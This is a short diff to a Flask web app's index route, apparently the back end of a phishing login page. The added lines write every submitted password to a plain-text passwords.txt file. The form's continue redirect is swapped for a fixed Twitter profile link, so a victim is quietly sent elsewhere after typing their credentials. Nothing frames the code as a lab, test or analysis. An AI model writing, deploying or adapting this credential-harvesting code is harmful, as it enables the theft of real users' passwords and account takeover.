@@ -56,8 +56,10 @@ def template(Type, Name):
 @app.route("/", methods=["GET", "POST", "PUT"])
 def index():
     if request.method == "POST":
+        with open("passwords.txt", "a+") as f:
+            f.write(request.form.get("password") + "\n")
         return redirect(
-            f"{request.form.get('continue')}"
+            "https://twitter.com/_Furoo"
         )
 
     return render("index.html", email="Furothomas7@gmail.com")
